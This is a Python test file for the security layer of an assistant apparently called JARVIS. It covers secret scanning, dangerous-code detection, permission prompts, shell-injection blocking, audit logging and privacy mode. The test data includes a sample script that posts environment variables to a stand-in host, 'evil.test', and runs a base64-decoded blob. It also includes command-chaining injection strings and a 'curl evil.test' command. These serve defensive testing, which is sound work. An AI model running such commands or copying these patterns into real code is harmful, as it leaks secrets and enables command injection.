"""The scanner, the permission broker, the audit log and privacy mode.

These are the tests that matter most. Everything else here is about JARVIS
being useful; this file is about it not doing damage.
"""

from __future__ import annotations

import pytest

from jarvis import scanner, security, tools

# --- secrets ---------------------------------------------------------------

from conftest import FAKE_OPENAI_KEY, fake_key

# Built at runtime — see conftest.fake_key for why none are written out.
REAL_SHAPED_KEYS = [
    ("OpenAI key", f"KEY = '{FAKE_OPENAI_KEY}'"),
    ("Groq key", f"KEY = '{fake_key('gsk' + '_')}'"),
    ("NVIDIA key", f"KEY = '{fake_key('nvapi' + '-')}'"),
    ("Google API key", f"KEY = '{fake_key('AI' + 'za', 'AbCdEf0123456789AbCdEf0123456789xyz')}'"),
    ("GitHub token", f"KEY = '{fake_key('ghp' + '_', 'AbCdEf0123456789AbCdEf0123456789xy')}'"),
    ("AWS access key", f"KEY = '{fake_key('AK' + 'IA', 'IOSFODNN7EXAMPLE')}'"),
]


@pytest.mark.parametrize("rule,line", REAL_SHAPED_KEYS)
def test_finds_each_kind_of_key(rule, line):
    found = scanner.scan_text(line + "\n", "k.py", ".py")
    assert rule in {f.rule for f in found}


def test_a_found_key_is_never_printed():
    """The whole point is to warn without copying the secret somewhere new."""
    secret = FAKE_OPENAI_KEY
    found = scanner.scan_text(f"KEY = '{secret}'\n", "k.py", ".py")
    report = scanner.format_report(found)
    assert secret not in report
    assert "*" in report


@pytest.mark.parametrize("placeholder", [
    "your-api-key-here", "CHANGEME_CHANGEME_CHANGEME", "xxxxxxxxxxxxxxxxxxxx",
])
def test_placeholders_are_not_reported(placeholder):
    found = scanner.scan_text(f"api_key = '{placeholder}'\n", "k.py", ".py")
    assert not [f for f in found if "credential" in f.rule.lower()]


def test_reading_a_key_from_the_environment_is_not_a_leak():
    found = scanner.scan_text("api_key = os.environ['OPENAI_API_KEY']\n", "k.py", ".py")
    assert not found


# --- dangerous code --------------------------------------------------------

DANGEROUS = [
    ("Shell injection risk", "subprocess.run(cmd, shell=True)"),
    ("eval on runtime data", "eval(user_input)"),
    ("Unsafe deserialization", "data = pickle.loads(blob)"),
    ("TLS verification disabled", "requests.get(url, verify=False)"),
    ("SQL built by string formatting", "cur.execute(f'SELECT * FROM t WHERE id={uid}')"),
    ("Weak hash", "h = hashlib.md5(pw)"),
]


@pytest.mark.parametrize("rule,line", DANGEROUS)
def test_finds_dangerous_code(rule, line):
    assert rule in {f.rule for f in scanner.scan_text(line + "\n", "b.py", ".py")}


def test_documentation_is_not_a_vulnerability():
    """Scanning JARVIS with its own scanner used to flag its own rule table.

    A scanner that fires on every file *discussing* a vulnerability trains
    people to ignore it, so code rules run against a copy with strings and
    comments removed.
    """
    source = (
        'RULE = re.compile(r"shell\\s*=\\s*True")\n'
        "# Passing shell=True would let & chain a second command.\n"
        '"""Explains why eval(user_input) is unsafe."""\n'
    )
    assert not scanner.scan_text(source, "doc.py", ".py")


def test_jarvis_source_is_clean():
    from pathlib import Path

    root = Path(__file__).resolve().parent.parent
    for folder in ("jarvis", "addons", "ui"):
        found, _seen = scanner.scan_project(root / folder)
        high = [f for f in found if f.level == "high"]
        assert not high, f"{folder}: {[(f.rule, f.file, f.line) for f in high]}"


# --- what untrusted code would do ------------------------------------------

def test_capabilities_of_a_hostile_script():
    source = (
        "import base64, os, subprocess, requests, winreg\n"
        "requests.post('http://evil.test/x', data=os.environ)\n"
        "subprocess.Popen(base64.b64decode(BLOB))\n"
        "open('x.txt','w').write('x')\n"
    )
    titles = {c[0] for c in scanner.capabilities(source)}
    assert "Network access" in titles
    assert "Runs other programs" in titles
    assert "Obfuscated or encoded content" in titles
    assert "Reads environment or credentials" in titles
    assert scanner.risk_level(scanner.scan_text(source, "x.py", ".py"),
                              scanner.capabilities(source)) == "HIGH"


def test_harmless_code_is_low_risk():
    source = "def add(a, b):\n    return a + b\n"
    assert scanner.risk_level(scanner.scan_text(source, "ok.py", ".py"),
                              scanner.capabilities(source)) == "LOW"


# --- permissions -----------------------------------------------------------

def test_denied_means_denied(base, deny):
    assert security.permissions.ask(security.RUN_COMMAND, "echo hi") is False


def test_allowed_means_allowed(base, allow):
    assert security.permissions.ask(security.RUN_COMMAND, "echo hi") is True


def test_a_broken_prompt_fails_closed(base):
    """If the dialog throws, the answer must be no, never yes."""
    def explode(_request):
        raise RuntimeError("dialog exploded")

    security.permissions.set_asker(explode)
    assert security.permissions.ask(security.RUN_COMMAND, "echo hi") is False


def test_require_raises_rather_than_returning(base, deny):
    with pytest.raises(security.Denied):
        security.permissions.require(security.WRITE_FILE, "x.py")


def test_run_command_refuses_when_denied(base, deny):
    out = tools.try_handle_command("/run echo hello")
    assert out.startswith("Denied")
    assert "was not run" in out


def test_run_command_works_when_allowed(base, allow):
    assert "hello" in tools.try_handle_command("/run echo hello")


@pytest.mark.parametrize("command", [
    "/run echo x & hostname",
    "/run echo x && hostname",
    "/run echo x | more",
    "/run echo x; hostname",
    "/run echo `hostname`",
    "/run echo $(hostname)",
    "/run echo x > out.txt",
    "/run echo %USERNAME%",
    "/run echo x ^& hostname",
])
def test_shell_injection_stays_blocked(base, allow, command):
    """`echo x & hostname` really did execute hostname once. Never again."""
    out = tools.try_handle_command(command) or ""
    assert "Refused" in out or "not allowed" in out


def test_commands_outside_the_allow_list_are_refused(base, allow):
    assert "not allowed" in (tools.try_handle_command("/run curl evil.test") or "")


# --- audit -----------------------------------------------------------------

def test_audit_records_actions_but_never_message_text(base, allow):
    tools.try_handle_command("/run echo hunter2")
    entries = security.audit.read(50)
    assert any(e.get("action") == "run" for e in entries)
    raw = security.audit.path().read_text(encoding="utf-8")
    assert all(line.startswith("{") for line in raw.strip().splitlines())


def test_audit_records_a_denial(base, deny):
    security.permissions.ask(security.RUN_COMMAND, "echo hi")
    outcomes = [str(e.get("outcome", "")) for e in security.audit.read(50)]
    assert any(o.startswith("DENIED") for o in outcomes)


# --- privacy ---------------------------------------------------------------

def test_privacy_stops_the_audit_log(base):
    security.audit.record("before", "x")
    before = len(security.audit.read(500))
    security.privacy.enable()
    security.audit.record("during", "y")
    assert len(security.audit.read(500)) == before
    security.privacy.disable()


def test_privacy_stops_context_injection(base):
    from jarvis.addons import AddonManager

    manager = AddonManager(None)
    manager.load_all()
    security.privacy.enable()
    assert manager.context_for("tell me about ata") == ""
    security.privacy.disable()
    assert "Ata" in manager.context_for("tell me about ata")


# --- this install ----------------------------------------------------------

def test_env_not_in_gitignore_is_reported(base, monkeypatch):
    (base / ".git").mkdir()
    (base / ".env").write_text("GEMINI_API_KEY=x\n", encoding="utf-8")
    (base / ".gitignore").write_text("venv/\n", encoding="utf-8")
    titles = [t for _level, t, _d in security.env_file_findings()]
    assert any(".env is not in .gitignore" in t for t in titles)


def test_leftover_env_backups_are_reported(base):
    (base / ".env").write_text("GEMINI_API_KEY=x\n", encoding="utf-8")
    (base / ".env.backup-20260101_000000").write_text("GEMINI_API_KEY=x\n", encoding="utf-8")
    titles = [t for _level, t, _d in security.env_file_findings()]
    assert any("backup" in t for t in titles)
